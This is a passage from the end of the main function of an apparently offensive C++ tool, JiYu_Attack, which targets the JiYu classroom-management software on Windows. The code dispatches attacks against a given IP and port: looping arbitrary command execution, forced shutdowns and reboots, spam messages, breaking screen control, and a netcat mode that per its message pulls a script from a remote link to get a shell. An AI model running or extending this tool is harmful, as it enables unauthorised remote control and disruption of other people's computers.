            else {
                printf("未找到\n");
            }
            return 0;
        }
        if(extraOpt.value == "break") {
            if(jyAtk->breakScreenControl() == 3) {
                printf("需要管理员权限。\n");
            }
            else printf("已退出屏幕控制。\n");
            return 0;
        }
        if(extraOpt.value == "continue") {
            if(jyAtk->continueScreenControl() == 3) {
                printf("需要管理员权限。\n");
            }
            else printf("已恢复屏幕控制。\n");
            return 0;
        }
    }
    if(!GetParamfromParams("ip", paramRets).exists) {
        printf("需要 IP 地址。\n");
        return 0;
    }
    std::string rawIP = GetParamfromParams("ip", paramRets).value;
    int port = strToInt(GetParamfromParams("port", paramRets).value);
    if(!isValidPort(port)) {
        printf("非法的端口号。\n");
        return 0;
    }
    if(extraOpt.exists) {
        if(extraOpt.value == "nc") {
            int ncport = strToInt(GetParamfromParams("ncport", paramRets).value);
            if(!isValidPort(ncport)) {
                printf("非法的 netcat 端口号。\n");
                return 0;
            }
            if(jyAtk->netcat(rawIP, port, ncport)) {
                printf("\nNetcat 失败。\n");
            }
            else {
                printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
            }
            return 0;
        }
    }
    int loopCount = strToInt(GetParamfromParams("l", paramRets).value);
    int loopInterval = strToInt(GetParamfromParams("t", paramRets).value);
    if(GetParamfromParams("msg", paramRets).exists) {
        std::string msg = GetParamfromParams("msg", paramRets).value;
        if(msg != "") {
            loopSend(loopCount, loopInterval, jyAtk, &JiYu_Attack::sendMsg, rawIP, port, msg);
            return 0;
        }
    }
    if(GetParamfromParams("cmd", paramRets).exists) {
        std::string cmd = GetParamfromParams("cmd", paramRets).value;
        if(cmd != "") {
            loopSend(loopCount, loopInterval, jyAtk, &JiYu_Attack::sendCmd, rawIP, port, cmd);
            return 0;
        }
    }
    if(extraOpt.exists) {
        if(extraOpt.value == "s") {
            loopSend(loopCount, loopInterval, jyAtk, &JiYu_Attack::sendShutdown, rawIP, port);
            return 0;
        }
        if(extraOpt.value == "r") {
            loopSend(loopCount, loopInterval, jyAtk, &JiYu_Attack::sendReboot, rawIP, port);
            return 0;
        }
    }
    printf("参数出现问题。请使用 -h 参数以获取帮助。\n");
    return 0;
}

#else
#error "Invalid system. Windows required."
#endif // _WIN32
